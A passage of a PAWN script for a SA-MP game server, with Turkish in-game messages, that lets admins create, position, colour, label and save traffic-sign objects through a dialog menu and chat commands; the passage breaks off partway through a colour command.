	format(levha, sizeof(levha), "%i,%f,%f,%f,%f,%f,%f,%i,%s,%s,%s", GetObjectModel(pObj[playerid]),x,y,z,rx,ry,rz,iBoyut[playerid],iRenk[playerid],tRenk[playerid],pObjText[playerid]);
	if(handle)
	{
		fread(handle, buf);
		fseek(handle, _, seek_end);
		if(strlen(buf) == 0) fwrite(handle, levha);
		else {
		    format(levha, sizeof(levha), "\r\n%i,%f,%f,%f,%f,%f,%f,%i,%s,%s,%s", GetObjectModel(pObj[playerid]),x,y,z,rx,ry,rz,iBoyut[playerid],iRenk[playerid],tRenk[playerid],pObjText[playerid]);
		    fwrite(handle, levha);
		}
		fclose(handle);
		SendClientMessage(playerid, -1, "{00ff00}<?> {ffffff}Trafik levhasý baþarýyla kayýt edildi.");
		DestroyObject(pObj[playerid]);
		pObj[playerid] = -255;
		format(pObjText[playerid], 128, "");
		TrafikGuncelle();
	}
	else
	{
		print("Trafik Ýþaret ve Levhalarý Scripti Dosya Baðlantý Hatasý!");
	}
	}
 	else
 	{
 	    print("\n-----------------------------------------");
 	    printf("  %s dosyasý scriptfiles klasöründe bulunamadý!", DOSYA);
 	    print("-----------------------------------------\n");
 	}
	return 1;
}

CMD:tguncelle(playerid, params[])
{
	#pragma unused params
	if(APlayerData[playerid][PlayerLevel] < 6) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	if(pObj[playerid] != -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Bir levha düzenliyorken bu komutu kullanamazsýnýz!");

	SendClientMessage(playerid, -1, "{00ff00}<?> {ffffff}Trafik levhalarý güncellendi.");
	TrafikGuncelle();
	return 1;
}

forward PustTabelaDialogs(playerid, dialogid, response, listitem, inputtext[]);
public PustTabelaDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == 954)
	{
	    if(response)
	    {
	        if(listitem == 0) // Tali yol - sað
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB1, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ1);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 0;
	        }
	        if(listitem == 1) // Tali yol - sol
			{
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB2, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ2);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 1;
	        }
	        if(listitem == 2) // Tali yol - yol bitiþ
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB3, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ3);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 2;
	        }
	        if(listitem == 3) // Tali yol - dörtlü
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB4, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ4);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 3;
	        }
	        if(listitem == 4) // Yön levhasý - normal
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB5, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ5);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 28;
	            lItem[playerid] = 4;
	        }
	        if(listitem == 5) // Yön levhasý - büyük
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB6, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ6);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 28;
	            lItem[playerid] = 5;
	        }
	        if(listitem == 6) // Yön levhasý - tekli büyük sol
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB7, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ7);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 28;
	            lItem[playerid] = 6;
	        }
	        if(listitem == 7) // Yol çalýþma levhasý - küçük
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB8, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ8);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 15;
	            lItem[playerid] = 7;
	        }
	        if(listitem == 8) // Kontrolsüz kavþak
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB9, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ9);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 8;
	        }
	        if(listitem == 9) // Yön levhasý - tekli büyük sað
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB10, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ10);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 28;
	            lItem[playerid] = 9;
	        }
	        if(listitem == 10) // Þehir levhasý - hoþgeldiniz küçük
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB11, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ11);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 15;
	            lItem[playerid] = 10;
	        }
	        if(listitem == 11) // Þehir levhasý - hoþgeldiniz normal
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB12, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ12);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 15;
	            lItem[playerid] = 11;
	        }
	        if(listitem == 12) // Hýz limiti levhasý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB13, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ13);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýyý düzenlemek için: /iyazi <yazi>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Levha rengi için: /trenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý rengi için: /irenk <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazý boyutu için: /iboyut <0xFF------>");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Yazýda alt satýra geçmek için | kullanýnýz.");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 15;
	            lItem[playerid] = 12;
	        }
	        if(listitem == 13) // Saða dönüþ yasaðý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB14, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ14);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 13;
	        }
	        if(listitem == 14) // Sola dönüþ yasaðý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB15, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ15);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 14;
	        }
	        if(listitem == 15) // Tehlikeli viraj sol
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB16, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ16);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 15;
	        }
	        if(listitem == 16) // Tehlikeli viraj sað
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB17, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ17);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 16;
	        }
	        if(listitem == 17) // Tehlikeli viraj sol x2
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB18, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ18);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 17;
	        }
	        if(listitem == 18) // Tehlikeli viraj sað x2
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB19, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ19);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 18;
	        }
	        if(listitem == 19) // Sola tehlikeli viraj
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB20, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ20);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 19;
	        }
	        if(listitem == 20) // Saða tehlikeli viraj
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB21, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ21);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 20;
	        }
	        if(listitem == 21) // Kýrmýzý ýþýk levhasý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB22, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ22);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 21;
	        }
	        if(listitem == 22) // Dur levhasý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB23, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ23);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 15;
	            lItem[playerid] = 22;
	        }
	        if(listitem == 23) // Tek yön levhasý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB24, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ24);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 15;
	            lItem[playerid] = 23;
	        }
	        if(listitem == 24) // Bilgi levhasý normal
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB25, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ25);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 15;
	            lItem[playerid] = 24;
	        }
	        if(listitem == 25) // Kazý çalýþmasý levhasý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB26, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ26);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 25;
	        }
 	        if(listitem == 26) // Yol ver levhasý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB27, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ27);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 26;
	        }
	        if(listitem == 27) // Çekme bölgesi levhasý
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB28, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ28);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            lItem[playerid] = 27;
	        }
	        if(listitem == 28) // Bilgi levhasý küçük
	        {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
	            pObj[playerid] = CreateObject(OB29, x, y, z + 2, 0, 0, 0);
	            new var0[256];
	            format(var0, sizeof(var0), "{00ff00}<?> {ffffff}%s baþarýyla oluþturuldu.", OBJ29);
	            SendClientMessage(playerid, -1, var0);
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Düzenlemek için: /ix | /iy | /iz | /irx | /iry | /irz");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Kaydetmek için /ikaydet");
	            SendClientMessage(playerid, -1, "{00ff00}* {ffffff}Silmek için /tiptal");
	            iBoyut[playerid] = 25;
	            lItem[playerid] = 28;
	        }
	    }
	}
	return 1;
}

CMD:irenk(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");

	if(lItem[playerid] == 0 && lItem[playerid] == 1 && lItem[playerid] == 2 && lItem[playerid] == 3 && lItem[playerid] == 8
	&& lItem[playerid] == 13 && lItem[playerid] == 14 && lItem[playerid] == 15
	&& lItem[playerid] == 16 && lItem[playerid] == 17 && lItem[playerid] == 18 && lItem[playerid] == 19
	&& lItem[playerid] == 20 && lItem[playerid] == 21 && lItem[playerid] == 22
	&& lItem[playerid] == 25 && lItem[playerid] == 26 && lItem[playerid] == 27)
	return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Bu objeye yazý yazamazsýnýz!");

	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/irenk <0xFF------>");

	format(iRenk[playerid], 24, "%s", params);
	SendClientMessage(playerid, -1, "{00ff00}<?> {ffffff}Renk kodu iþleme alýndý, yazýyý deðiþtirdikten sonra görüntülenecek.");
	return 1;
}

CMD:trenk(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");

	if(lItem[playerid] == 0 && lItem[playerid] == 1 && lItem[playerid] == 2 && lItem[playerid] == 3 && lItem[playerid] == 8
	&& lItem[playerid] == 13 && lItem[playerid] == 14 && lItem[playerid] == 15
	&& lItem[playerid] == 16 && lItem[playerid] == 17 && lItem[playerid] == 18 && lItem[playerid] == 19
	&& lItem[playerid] == 20 && lItem[playerid] == 21 && lItem[playerid] == 22
	&& lItem[playerid] == 25 && lItem[playerid] == 26 && lItem[playerid] == 27)
